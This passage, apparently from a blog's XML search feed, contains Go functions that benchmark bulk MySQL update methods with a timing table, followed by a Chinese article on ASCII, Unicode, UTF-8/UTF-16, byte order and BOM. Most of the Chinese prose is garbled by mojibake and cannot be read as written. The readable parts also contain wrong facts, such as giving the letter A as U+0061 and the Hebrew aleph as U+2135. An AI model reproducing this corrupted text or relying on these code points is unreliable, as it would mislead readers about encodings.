THEN 'New Title 2'// WHEN 3 THEN 'New Title 3'// END// WHERE id IN (1,2,3)func bulkStandardUpdate() &#123; start := time.Now() core := "" where := "" for i := 0; i &lt; 10000; i++ &#123; name := "standardupdate" + strconv.Itoa(i) core += fmt.Sprintf("WHEN '%d' THEN '%s' ", i+1, name) if i == 0 &#123; where += fmt.Sprintf("'%d'", i+1) &#125; else &#123; where += fmt.Sprintf(",'%d'", i+1) &#125; &#125; sql := fmt.Sprintf("UPDATE `user` SET `user_name`= CASE `user_id` %s END WHERE `user_id` IN (%s)", core, where) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Standard Update Total Time: ", delta)&#125; SQLæ‰©å±•(INSERT INTO â€¦ ON DUPLICATE KEY UPDATE)123456789101112131415161718192021222324252627282930// insert intoè¯­å¥æ›´æ–°// INSERT INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y') ON DUPLICATE KEY UPDATE dr=values(dr);func bulkInsertIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "insertintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("INSERT INTO `user` (`user_id`, `user_name`) VALUES %s ON DUPLICATE KEY UPDATE `user_name`=values(`user_name`);", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Insert Into Update Total Time: ", delta)&#125; SQLæ‰©å±•(REPLACE INTO)123456789101112131415161718192021222324252627282930// replace inotè¯­å¥æ›´æ–°// REPLACE INTO test_tbl (id,dr) VALUES (1,'2'),(2,'3'),...(x,'y');func bulkReplaceIntoUpdate() &#123; start := time.Now() core := "" for i := 0; i &lt; 10000; i++ &#123; name := "replaceintoupdate" + strconv.Itoa(i) if i == 0 &#123; core += fmt.Sprintf("('%d', '%s')", i+1, name) &#125; else &#123; core += fmt.Sprintf(",('%d', '%s')", i+1, name) &#125; &#125; sql := fmt.Sprintf("REPLACE INTO `user` (`user_id`, `user_name`) VALUES %s;", core) tx, err := db.Begin() checkErr(err) _, err = tx.Exec(sql) if err == nil &#123; tx.Commit() &#125; else &#123; fmt.Println(err) tx.Rollback() &#125; delta := time.Now().Sub(start).String() fmt.Println("Bulk Replace Into Update Total Time: ", delta)&#125; æ€»ç»“æœ€å¯¹4ç§çŠ¶å†µçš„æ’å…¥æ—¶é—´æŽ’å: Ranking Function Name Time 1 bulkInsertIntoUpdate 462.575115ms 2 bulkReplaceIntoUpdate 564.974107ms 3 bulkStandardUpdate 3.160858907s 4 withTxUpdate 3.998437161s ç»“è®ºå¾ˆæ˜Žæ˜¾: InsertIntoæ›´æ–°æ•ˆçŽ‡é«˜å¾ˆå¤š]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¼–ç çŸ¥è¯†ä¸Žå¸¸è§ä¹±ç é—®é¢˜çš„è§£å†³åŠžæ³•]]></title>
    <url>%2F2017%2F05%2F14%2Funicode-war%2F</url>
    <content type="text"><![CDATA[æœ‰ä¸€ä¸ªå³ä½¿åœ¨ç»éªŒä¸°å¯Œçš„ç¨‹åºå‘˜ä¸­ä¹Ÿéžå¸¸å¸¸è§çš„è¯¯è§£å°±æ˜¯ï¼Œçº¯æ–‡æœ¬ä½¿ç”¨ASCIIç å¹¶ä¸”æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯8bitsã€‚äº‹å®žä¸Šå¹¶ä¸å­˜åœ¨è¿™æ ·çš„çº¯æ–‡æœ¬ ï¼Œå¦‚æžœåœ¨å†…å­˜æˆ–è€…æ˜¯ç¡¬ç›˜ä¸Šé¢æœ‰ä¸€ä¸ªä½ ä¸çŸ¥é“ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä½ å°†æ— æ³•ç¿»è¯‘æˆ–è€…æ˜¾ç¤ºå®ƒ ï¼Œè¿™ç»å¯¹æ²¡æœ‰ç¬¬äºŒæ¡è·¯å¯é€‰ã€‚ æ•°æ®çš„æœ¬è´¨: äºŒè¿›åˆ¶CPUèƒ½è¯†åˆ«çš„æ•°æ®: CPUæ˜¯åˆ©ç”¨æ•°å­—ç”µè·¯è®¾è®¡å‡ºæ¥çš„,æ‰€ä»¥ä»…èƒ½è¯†åˆ«äºŒè¿›åˆ¶çš„æ•°æ®ã€‚ç£ç›˜èƒ½è¯†åˆ«çš„æ•°æ®ï¼š ç£ç›˜ä¸Šæœ‰å¾ˆå¤šç£æ€§çš„ç‚¹ï¼Œè€Œè¿™äº›ç‚¹ æœ‰2ç§çŠ¶æ€ï¼Œæ‰€ä»¥ä»»ä½•æ•°æ® ä»…èƒ½è½¬æ¢æˆ2è¿›ç¨‹ ï¼ŒåŠ01 ä»£ç  æ‰èƒ½åˆ©ç”¨ç£ç›˜çš„ç‚¹çš„è¿™ç§ç‰¹æ€§ æ¥è¿›è¡Œå­˜å‚¨ ï¼Œæ‰€ä»¥ä»»ä½•å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„æ•°æ® éƒ½æ˜¯äºŒè¿›åˆ¶ç½‘ç»œä¼ è¾“çš„æ•°æ®ï¼šé€šè¿‡ç½‘ç»œè¾“å‡ºè¿‡æ¥çš„æ•°æ®ï¼Œä¸ºé«˜ä½Žç”µé¢‘ï¼Œä¹Ÿå¯¹åº”äºŒè¿›åˆ¶ ä½†æ˜¯ä¸ºå•¥æˆ‘ä»¬çœ‹åˆ°çš„æ•°æ®éƒ½ä¸æ˜¯01ä»£ç å–ƒ, æ¯”å¦‚æ•°æ®ï¼š ä¸€ä¸²äºŒè¿›åˆ¶çš„bitsï¼š0100100001000101010011000100110001001111 ä¸ºå•¥æœ€åŽæˆ‘ä»¬ç”¨æ–‡æœ¬å·¥å…·æ‰“å¼€åŽ, çœ‹åˆ°çš„æ˜¯HELLOè€Œä¸æ˜¯01ä»£ç æœ¬èº«å–ƒï¼Ÿé‚£æ–‡æœ¬ç¼–è¾‘å™¨æ˜¯æ€Žä¹ˆå°†äºŒè¿›åˆ¶ç¿»è¯‘æˆå­—ç¬¦çš„å–ƒï¼Ÿè¿™é‡Œæœ‰2ä¸ªå…³é”®çš„é—®é¢˜: å­—èŠ‚æ˜¯æ€Žæ ·åˆ†ç»„çš„ï¼Ÿï¼ˆä¾‹å¦‚1ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯2ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼‰ ä¸€ä¸ªæˆ–å¤šä¸ªå­—èŠ‚æ˜¯æ€Žä¹ˆæ˜ å°„åˆ°å­—ç¬¦ä¸Šçš„? è¿™å°±æ˜¯æˆ‘ä»¬è¦è¯´çš„ç¼–ç éœ€è¦è§£å†³çš„é—®é¢˜ã€‚ ç¼–ç æ¦‚å¿µç¼–ç çš„æ ¸å¿ƒæ˜¯å®šä¹‰äº†å¦‚ä¸‹2ä»¶äº‹æƒ…: å­—èŠ‚æ˜¯æ€Žä¹ˆåˆ†ç»„çš„ï¼Œå¦‚8 bitsæˆ–16 bitsä¸€ç»„ï¼Œè¿™ä¹Ÿè¢«ç§°ä½œç¼–ç å•å…ƒã€‚ ç¼–ç å•å…ƒå’Œå­—ç¬¦ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ä¾‹å¦‚ï¼Œåœ¨ASCIIç ä¸­ï¼Œåè¿›åˆ¶65æ˜ å°„åˆ°å­—æ¯Aä¸Š ç¼–ç ä¹‹æˆ˜æ··æˆ˜å¹´ä»£å¾ˆä¹…ä»¥å‰ï¼Œè®¡ç®—æœºåˆ¶é€ å•†æœ‰è‡ªå·±çš„è¡¨ç¤ºå­—ç¬¦çš„æ–¹å¼ã€‚ä»–ä»¬å¹¶ä¸éœ€è¦æ‹…å¿ƒå¦‚ä½•å’Œå…¶å®ƒè®¡ç®—æœºäº¤æµï¼Œå¹¶æå‡ºäº†å„è‡ªçš„æ–¹å¼æ¥å°†å­—å½¢æ¸²æŸ“åˆ°å±å¹•ä¸Šã€‚éšç€è®¡ç®—æœºè¶Šæ¥è¶Šæµè¡Œï¼ŒåŽ‚å•†ä¹‹é—´çš„ç«žäº‰æ›´åŠ æ¿€çƒˆï¼Œåœ¨ä¸åŒçš„è®¡ç®—æœºä½“ç³»é—´è½¬æ¢æ•°æ®å˜å¾—ååˆ†è›‹ç–¼ï¼Œäººä»¬åŽŒçƒ¦äº†è¿™ç§è‡ªå®šä¹‰é€ æˆçš„æ··ä¹±ã€‚ ASCIIç çš„åˆ°æ¥æœ€ç»ˆï¼Œè®¡ç®—æœºåˆ¶é€ å•†ä¸€èµ·åˆ¶å®šäº†ä¸€ä¸ªæ ‡å‡†çš„æ–¹æ³•æ¥æè¿°å­—ç¬¦ã€‚ä»–ä»¬å®šä¹‰ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚çš„ä½Ž7ä½æ¥è¡¨ç¤ºå­—ç¬¦ï¼Œå¹¶ä¸”åˆ¶ä½œäº†å¦‚ä¸Šå›¾æ‰€ç¤ºçš„å¯¹ç…§è¡¨æ¥æ˜ å°„ä¸ƒä¸ªæ¯”ç‰¹çš„å€¼åˆ°ä¸€ä¸ªå­—ç¬¦ä¸Šã€‚ä¾‹å¦‚ï¼Œå­—æ¯Aæ˜¯65ï¼Œcæ˜¯99ï¼Œ~æ˜¯126ç­‰ç­‰ï¼Œ ASCIIç å°±è¿™æ ·è¯žç”Ÿäº†ã€‚åŽŸå§‹çš„ASCIIæ ‡å‡†å®šä¹‰äº†ä»Ž0åˆ°127 çš„å­—ç¬¦ï¼Œè¿™æ ·æ­£å¥½èƒ½ç”¨ä¸ƒä¸ªæ¯”ç‰¹è¡¨ç¤ºã€‚ä¸è¿‡å¥½æ™¯ä¸é•¿ã€‚ã€‚ã€‚ ASCIIç ç¬¬å…«ä½ å¼•èµ·çš„æˆ˜äº‰ä¸ºä»€ä¹ˆé€‰æ‹©äº†7ä¸ªæ¯”ç‰¹è€Œä¸æ˜¯8ä¸ªæ¥è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦å‘¢ï¼Ÿæˆ‘å¹¶ä¸å…³å¿ƒã€‚ä½†æ˜¯ä¸€ä¸ªå­—èŠ‚æ˜¯8ä¸ªæ¯”ç‰¹ï¼Œè¿™æ„å‘³ç€1ä¸ªæ¯”ç‰¹å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯ä»Ž128åˆ°255çš„ç¼–ç å¹¶æ²¡æœ‰è¢«åˆ¶å®šASCIIæ ‡å‡†çš„äººæ‰€è§„å®šï¼Œè¿™äº›ç¾Žå›½äººå¯¹ä¸–ç•Œçš„å…¶å®ƒåœ°æ–¹ä¸€æ— æ‰€çŸ¥ç”šè‡³å®Œå…¨ä¸å…³å¿ƒã€‚å…¶å®ƒå›½å®¶çš„äººè¶è¿™ä¸ªæœºä¼šå¼€å§‹ä½¿ç”¨128åˆ°255èŒƒå›´å†…çš„ç¼–ç æ¥è¡¨è¾¾è‡ªå·±è¯­è¨€ä¸­çš„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ144åœ¨é˜¿æ‹‰ä¼¯äººçš„ASCIIç ä¸­æ˜¯Ú¯ï¼Œè€Œåœ¨ä¿„ç½—æ–¯çš„ASCIIç ä¸­æ˜¯Ñ’ã€‚å³ä½¿åœ¨ç¾Žå›½ï¼Œå¯¹äºŽæœªä½¿ç”¨åŒºåŸŸä¹Ÿæœ‰å„ç§å„æ ·çš„åˆ©ç”¨ã€‚IBM PCå°±å‡ºçŽ°äº†â€œOEM å­—ä½“â€æˆ–â€æ‰©å±•ASCIIç â€ï¼Œä¸ºç”¨æˆ·æä¾›æ¼‚äº®çš„å›¾å½¢æ–‡å­—æ¥ç»˜åˆ¶æ–‡æœ¬æ¡†å¹¶æ”¯æŒä¸€äº›æ¬§æ´²å­—ç¬¦ï¼Œä¾‹å¦‚è‹±é•‘ï¼ˆÂ£ï¼‰ç¬¦å·ã€‚å†å¼ºè°ƒä¸€éï¼ŒASCIIç çš„é—®é¢˜åœ¨äºŽå°½ç®¡æ‰€æœ‰äººéƒ½åœ¨0-127å·å­—ç¬¦çš„ä½¿ç”¨ä¸Šè¾¾æˆäº†ä¸€è‡´ï¼Œä½†å¯¹äºŽ128-255å·å­—ç¬¦å´æœ‰å¾ˆå¤šå¾ˆå¤šä¸åŒçš„è§£é‡Šã€‚ä½ å¿…é¡»å‘Šè¯‰è®¡ç®—æœºä½¿ç”¨å“ªç§é£Žæ ¼çš„ASCIIç æ‰èƒ½æ­£ç¡®æ˜¾ç¤º128-255å·çš„å­—ç¬¦ã€‚è¿™å¯¹äºŽåŒ—ç¾Žäººå’Œä¸åˆ—é¢ ç¾¤å²›çš„äººæ¥è¯´ä¸ç®—ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºæ— è®ºä½¿ç”¨å“ªç§é£Žæ ¼çš„ASCIIç ï¼Œæ‹‰ä¸å­—æ¯çš„æ˜¾ç¤ºéƒ½æ˜¯ä¸€æ ·çš„ã€‚è‹±å›½äººè¿˜éœ€è¦é¢å¯¹çš„é—®é¢˜æ˜¯åŽŸå§‹çš„ASCIIç ä¸­ä¸åŒ…å«è‹±é•‘ç¬¦å·ï¼Œä½†æ˜¯è¿™ä¸ªå·²ç»æ— å…³ç´§è¦äº†ã€‚ä¸Žæ­¤åŒæ—¶ï¼Œåœ¨äºšæ´²æœ‰æ›´è®©äººå¤´ç–¼çš„é—®é¢˜ã€‚äºšæ´²è¯­è¨€æœ‰æ›´å¤šçš„å­—ç¬¦å’Œå­—å½¢éœ€è¦è¢«å­˜å‚¨ï¼Œä¸€ä¸ªå­—èŠ‚å·²ç»ä¸å¤Ÿç”¨äº†ã€‚æ‰€ä»¥ä»–ä»¬å¼€å§‹ä½¿ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥å­˜å‚¨å­—ç¬¦ï¼Œè¿™è¢«ç§°ä½œDBCSï¼ˆåŒå­—èŠ‚ç¼–ç æ–¹æ¡ˆï¼‰ã€‚åœ¨DBCSä¸­ï¼Œå­—ç¬¦ä¸²æ“ä½œå˜å¾—å¾ˆè›‹ç–¼ï¼Œä½ åº”è¯¥æ€Žä¹ˆåšstr++æˆ–strâ€“ï¼Ÿè¿™äº›é—®é¢˜æˆä¸ºäº†ç³»ç»Ÿå¼€å‘è€…çš„å™©æ¢¦ã€‚ä¾‹å¦‚ï¼ŒMS DOSå¿…é¡»æ”¯æŒæ‰€æœ‰é£Žæ ¼çš„ASCIIç ï¼Œå› ä¸ºä»–ä»¬æƒ³æŠŠè½¯ä»¶å–åˆ°å…¶ä»–å›½å®¶åŽ»ã€‚ä»–ä»¬æå‡ºäº†ã€Œå†…ç è¡¨ã€è¿™ä¸€æ¦‚å¿µã€‚ä¾‹å¦‚ï¼Œä½ éœ€è¦å‘Šè¯‰DOSï¼ˆé€šè¿‡ä½¿ç”¨â€chcpâ€å‘½ä»¤ï¼‰ä½ æƒ³ä½¿ç”¨ä¿åŠ åˆ©äºšè¯­çš„å†…ç è¡¨ï¼Œå®ƒæ‰èƒ½æ˜¾ç¤ºä¿åŠ åˆ©äºšå­—æ¯ã€‚å†…ç è¡¨çš„æ›´æ¢ä¼šåº”ç”¨åˆ°æ•´ä¸ªç³»ç»Ÿã€‚è¿™å¯¹ä½¿ç”¨å¤šç§è¯­è¨€å·¥ä½œçš„äººæ¥è¯´æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºä»–ä»¬å¿…é¡»é¢‘ç¹çš„åœ¨å‡ ä¸ªå†…ç è¡¨ä¹‹é—´æ¥å›žåˆ‡æ¢ã€‚å°½ç®¡å†…ç è¡¨æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œä½†æ˜¯å®ƒä¸æ˜¯ä¸€ä¸ªç®€æ´çš„è§£å†³æ–¹æ¡ˆï¼Œå®ƒåªæ˜¯ä¸€ä¸ªhackæŠ€æœ¯æˆ–è€…è¯´æ˜¯ç®€å•çš„ä¿®æ­£æ¥è®©ç¼–ç ç³»ç»Ÿå¯ä»¥å·¥ä½œã€‚ Unicodeçš„ä¸–ç•Œæœ€ç»ˆï¼Œç¾Žå›½äººæ„è¯†åˆ°ä»–ä»¬åº”è¯¥æå‡ºä¸€ç§æ ‡å‡†æ–¹æ¡ˆæ¥å±•ç¤ºä¸–ç•Œä¸Šæ‰€æœ‰è¯­è¨€ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œä»¥ä¾¿ç¼“è§£ç¨‹åºå‘˜çš„ç—›è‹¦å’Œé¿å…å­—ç¬¦ç¼–ç å¼•å‘çš„ç¬¬ä¸‰æ¬¡ä¸–ç•Œå¤§æˆ˜ã€‚å‡ºäºŽè¿™ä¸ªç›®çš„ï¼ŒUnicodeè¯žç”Ÿäº†ã€‚UnicodeèƒŒåŽçš„æƒ³æ³•éžå¸¸ç®€å•ï¼Œç„¶è€Œå´è¢«æ™®éçš„è¯¯è§£äº†ã€‚Unicodeå°±åƒä¸€ä¸ªç”µè¯æœ¬ï¼Œæ ‡è®°ç€å­—ç¬¦å’Œæ•°å­—ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚Joelç§°ä¹‹ä¸ºã€Œç¥žå¥‡æ•°å­—ã€ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½æ˜¯éšæœºæŒ‡å®šçš„ï¼Œè€Œä¸”ä¸ä¼šç»™å‡ºä»»ä½•è§£é‡Šã€‚å®˜æ–¹æœ¯è¯­æ˜¯ç ä½(Code Point)ï¼Œæ€»æ˜¯ç”¨U+å¼€å¤´ã€‚ç†è®ºä¸Šæ¯ç§è¯­è¨€ä¸­çš„æ¯ç§å­—ç¬¦éƒ½è¢«Unicodeåä¼šæŒ‡å®šäº†ä¸€ä¸ªç¥žå¥‡æ•°å­—ã€‚ä¾‹å¦‚å¸Œä¼¯æ¥æ–‡ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ¯×ï¼Œæ˜¯U+2135ï¼Œå­—æ¯Aæ˜¯U+0061ã€‚Unicodeå¹¶ä¸æ¶‰åŠå­—ç¬¦æ˜¯æ€Žä¹ˆåœ¨å­—èŠ‚ä¸­è¡¨ç¤ºçš„ï¼Œå®ƒä»…ä»…æŒ‡å®šäº†å­—ç¬¦å¯¹åº”çš„æ•°å­—ï¼Œä»…æ­¤è€Œå·²ã€‚å…³äºŽUnicodeçš„å…¶å®ƒè¯¯è§£åŒ…æ‹¬ï¼šUnicodeæ”¯æŒçš„å­—ç¬¦ä¸Šé™æ˜¯65536ä¸ªï¼ŒUnicodeå­—ç¬¦å¿…é¡»å ä¸¤ä¸ªå­—èŠ‚ã€‚å‘Šè¯‰ä½ è¿™äº›çš„äººåº”è¯¥åŽ»æ¢æ¢è„‘å­äº†ã€‚è®°ä½ï¼ŒUnicodeåªæ˜¯ä¸€ä¸ªç”¨æ¥æ˜ å°„å­—ç¬¦å’Œæ•°å­—çš„æ ‡å‡†ã€‚å®ƒå¯¹æ”¯æŒå­—ç¬¦çš„æ•°é‡æ²¡æœ‰é™åˆ¶ï¼Œä¹Ÿä¸è¦æ±‚å­—ç¬¦å¿…é¡»å ä¸¤ä¸ªã€ä¸‰ä¸ªæˆ–è€…å…¶å®ƒä»»æ„æ•°é‡çš„å­—èŠ‚ã€‚Unicodeå­—ç¬¦æ˜¯æ€Žæ ·è¢«ç¼–ç æˆå†…å­˜ä¸­çš„å­—èŠ‚è¿™æ˜¯å¦å¤–çš„è¯é¢˜ï¼Œå®ƒæ˜¯è¢«UTF(Unicode Transformation Formats)å®šä¹‰çš„ã€‚ Unicodeçš„å®žçŽ°ä¸¤ä¸ªæœ€æµè¡Œçš„Unicodeç¼–ç æ–¹æ¡ˆæ˜¯UTF-8å’ŒUTF-16ã€‚è®©æˆ‘ä»¬çœ‹çœ‹å®ƒä»¬çš„ç»†èŠ‚UTF-8æ˜¯ä¸€ä¸ªéžå¸¸æƒŠè‰³çš„æ¦‚å¿µï¼Œå®ƒæ¼‚äº®çš„å®žçŽ°äº†å¯¹ASCIIç çš„å‘åŽå…¼å®¹ï¼Œä»¥ä¿è¯Unicodeå¯ä»¥è¢«å¤§ä¼—æŽ¥å—ã€‚å‘æ˜Žå®ƒçš„äººè‡³å°‘åº”è¯¥å¾—ä¸ªè¯ºè´å°”å’Œå¹³å¥–ã€‚åœ¨UTF-8ä¸­ï¼Œ0-127å·çš„å­—ç¬¦ç”¨1ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œä½¿ç”¨å’ŒUS-ASCIIç›¸åŒçš„ç¼–ç ã€‚è¿™æ„å‘³ç€1980å¹´ä»£å†™çš„æ–‡æ¡£ç”¨UTF-8æ‰“å¼€ä¸€ç‚¹é—®é¢˜éƒ½æ²¡æœ‰ã€‚åªæœ‰128å·åŠä»¥ä¸Šçš„å­—ç¬¦æ‰ç”¨2ä¸ªï¼Œ3ä¸ªæˆ–è€…4ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚å› æ­¤ï¼ŒUTF-8è¢«ç§°ä½œå¯å˜é•¿åº¦ç¼–ç ã€‚0100100001000101010011000100110001001111è¿™ä¸ªå­—èŠ‚æµåœ¨ASCIIå’ŒUTF-8ä¸­è¡¨ç¤ºç›¸åŒçš„å­—ç¬¦ï¼šHELLOå¦ä¸€ä¸ªæµè¡Œçš„å¯å˜é•¿åº¦ç¼–ç æ–¹æ¡ˆæ˜¯UTF-16ï¼Œå®ƒä½¿ç”¨2ä¸ªæˆ–è€…4ä¸ªå­—èŠ‚æ¥å­˜å‚¨å­—ç¬¦ã€‚ç„¶è€Œï¼Œäººä»¬é€æ¸æ„è¯†åˆ°UTF-16å¯èƒ½ä¼šæµªè´¹å­˜å‚¨ç©ºé—´ï¼Œä½†é‚£æ˜¯å¦ä¸€ä¸ªè¯é¢˜äº†ã€‚ ç¼–ç æŽ’åºä½Žå­—èŠ‚åº(Little Endian)å’Œé«˜å­—èŠ‚åº(Big Endian)Endianè¯»ä½œEnd-ianæˆ–è€…Indianã€‚è¿™ä¸ªæœ¯è¯­çš„èµ·æºå¯ä»¥è¿½æº¯åˆ°æ ¼åˆ—ä½›æ¸¸è®°ã€‚ï¼ˆå°è¯´ä¸­ï¼Œå°äººå›½ä¸ºæ°´ç…®è›‹åº”è¯¥ä»Žå¤§çš„ä¸€ç«¯ï¼ˆBig-Endï¼‰å‰¥å¼€è¿˜æ˜¯å°çš„ä¸€ç«¯ï¼ˆLittle-Endï¼‰å‰¥å¼€è€Œäº‰è®ºï¼Œäº‰è®ºçš„åŒæ–¹åˆ†åˆ«è¢«ç§°ä¸ºâ€œå¤§ç«¯æ´¾â€å’Œâ€œå°ç«¯æ´¾â€ã€‚ï¼‰ä½Žå­—èŠ‚åºå’Œé«˜å­—èŠ‚åºåªæ˜¯ä¸€ä¸ªå…³äºŽåœ¨å†…å­˜ä¸­å­˜å‚¨å’Œè¯»å–ä¸€æ®µå­—èŠ‚ï¼ˆè¢«ç§°ä½œwordsï¼‰çš„çº¦å®šã€‚è¿™æ„å‘³ç€å½“ä½ è®©è®¡ç®—æœºç”¨UTF-16æŠŠå­—æ¯Aï¼ˆå ä¸¤ä¸ªå­—èŠ‚ï¼‰å­˜åœ¨å†…å­˜ä¸­æ—¶ï¼Œä½¿ç”¨å“ªç§å­—èŠ‚åºæ–¹æ¡ˆå†³å®šäº†ä½ æŠŠç¬¬ä¸€ä¸ªå­—èŠ‚æ”¾åœ¨ç¬¬äºŒä¸ªå­—èŠ‚çš„å‰é¢è¿˜æ˜¯åŽé¢ã€‚è¿™ä¹ˆè¯´æœ‰ç‚¹ä¸å¤ªå®¹æ˜“æ‡‚ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼šå½“ä½ ä½¿ç”¨UTF-16å­˜ä¸‹æ¥è‡ªä½ æœ‹å‹çš„é™„ä»¶æ—¶ï¼Œåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­å®ƒçš„åŽåŠéƒ¨åˆ†å¯èƒ½æ˜¯è¿™æ ·çš„ï¼š00 68 00 65 00 6C 00 6C 00 6Fï¼ˆé«˜å­—èŠ‚åºï¼Œé«˜ä½å­—èŠ‚è¢«å­˜åœ¨å‰é¢ï¼‰68 00 65 00 6C 00 6C 00 6F 00ï¼ˆä½Žå­—èŠ‚åºï¼Œä½Žä½å­—èŠ‚è¢«å­˜åœ¨å‰é¢ï¼‰å­—èŠ‚åºæ–¹æ¡ˆåªæ˜¯ä¸€ä¸ªå¾®å¤„ç†å™¨æž¶æž„è®¾è®¡è€…çš„åå¥½é—®é¢˜ï¼Œä¾‹å¦‚ï¼ŒIntelä½¿ç”¨ä½Žå­—èŠ‚åºï¼ŒMotorolaä½¿ç”¨é«˜å­—èŠ‚åºã€‚ å­—èŠ‚é¡ºåºæ ‡è®°å¦‚æžœä½ ç»å¸¸è¦åœ¨é«˜ä½Žå­—èŠ‚åºçš„ç³»ç»Ÿé—´è½¬æ¢æ–‡æ¡£ï¼Œå¹¶ä¸”å¸Œæœ›åŒºåˆ†å­—èŠ‚åºï¼Œè¿˜æœ‰ä¸€ç§å¥‡æ€ªçš„çº¦å®šï¼Œè¢«ç§°ä½œBOMã€‚BOMæ˜¯ä¸€ä¸ªè®¾è®¡å¾—å¾ˆå·§å¦™çš„å­—ç¬¦ï¼Œç”¨æ¥æ”¾åœ¨æ–‡æ¡£çš„å¼€å¤´å‘Šè¯‰é˜…è¯»å™¨è¯¥æ–‡æ¡£çš„å­—èŠ‚åºã€‚åœ¨UTF-16ä¸­ï¼Œå®ƒæ˜¯é€šè¿‡åœ¨ç¬¬ä¸€ä¸ªå­—èŠ‚æ”¾ç½®FE FFæ¥å®žçŽ°çš„ã€‚åœ¨ä¸åŒå­—èŠ‚åºçš„æ–‡æ¡£ä¸­ï¼Œå®ƒä¼šè¢«æ˜¾ç¤ºæˆFF FEæˆ–è€…FE FFï¼Œæ¸…æ¥šçš„æŠŠè¿™ç¯‡æ–‡æ¡£çš„å­—èŠ‚åºå‘Šè¯‰äº†è§£é‡Šå™¨ã€‚ BOMå°½ç®¡å¾ˆæœ‰ç”¨ï¼Œä½†å¹¶ä¸æ˜¯å¾ˆç®€æ´ï¼Œå› ä¸ºè¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„æ¦‚å¿µï¼Œç§°ä½œã€Œé­”æœ¯å­—ã€(Magic Byte)ï¼Œå¾ˆå¤šå¹´æ¥ä¸€ç›´è¢«ç”¨æ¥è¡¨æ˜Žæ–‡ä»¶çš„æ ¼å¼ã€‚BOMå’Œé­”æœ¯å­—é—´çš„å…³ç³»ä¸€ç›´æ²¡æœ‰è¢«æ¸…æ¥šçš„å®šä¹‰è¿‡ï¼Œå› æ­¤æœ‰çš„è§£é‡Šå™¨ä¼šæžæ··å®ƒä»¬ã€‚ å¸¸è§çš„ç¼–ç å¼•èµ·çš„é—®é¢˜æˆ‘ä»¬çœ‹åˆ°çš„ä»»ä½•è¾“å‡ºï¼Œéƒ½æ˜¯ç¨‹åºå±•ç¤ºæˆ‘ä»¬çš„ï¼Œç¨‹åºæ ¹æ®ç¼–ç æ¥è¿›è¡Œè¿™ä¸ªæ˜ å°„å…³ç³»çš„è½¬æ¢ï¼Œå¦‚æžœç¨‹åºæŠŠè¿™ç¼–ç æžé”™äº†ï¼Œå°±ä¼šå‡ºçŽ°ä¹±ç é—®é¢˜å½“è½¯ä»¶ä¸èƒ½ç¡®å®šç¼–ç çš„æ—¶å€™ï¼Œå®ƒä¼šçŒœæµ‹ã€‚å¤§éƒ¨åˆ†æ—¶å€™ï¼Œå®ƒä¼šçŒœæµ‹æ˜¯å¦æ˜¯æ¶µç›–äº†ASCIIç çš„UTF-8ï¼Œè¿˜æ˜¯ISO-8859-1ï¼Œä¹Ÿæœ‰å¯èƒ½çŒœå…¶ä»–èƒ½æƒ³åˆ°çš„ä»»æ„å­—ç¬¦é›†ã€‚å› ä¸ºè‹±æ–‡ä¸­ä½¿ç”¨çš„æ‹‰ä¸å­—æ¯è¡¨åœ¨å‡ ä¹Žæ‰€æœ‰çš„å­—ç¬¦é›†ä¸­éƒ½èƒ½æ˜¾ç¤ºï¼ŒåŒ…æ‹¬UTF-8ï¼Œæ‰€ä»¥å³ä½¿ç¼–ç çŒœé”™äº†ï¼Œè‹±æ–‡å­—æ¯çœ‹èµ·æ¥ä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚ æµè§ˆå™¨ä¹±ç é—®é¢˜å¦‚æžœä½ åœ¨æµè§ˆç½‘é¡µæ—¶çœ‹åˆ°ï¿½ç¬¦å·ï¼Œè¿™æ„å‘³ç€è¿™ä¸ªç½‘é¡µçš„ç¼–ç ä¸æ˜¯ä½ çš„æµè§ˆå™¨çŒœæµ‹çš„é‚£ä¸ªã€‚è¿™æ—¶ä½ å¯ä»¥ç‚¹å¼€æµè§ˆå™¨çš„æŸ¥çœ‹-&gt;å­—ç¬¦ç¼–ç èœå•æ¥å°è¯•ä¸åŒçš„ç¼–ç ã€‚ 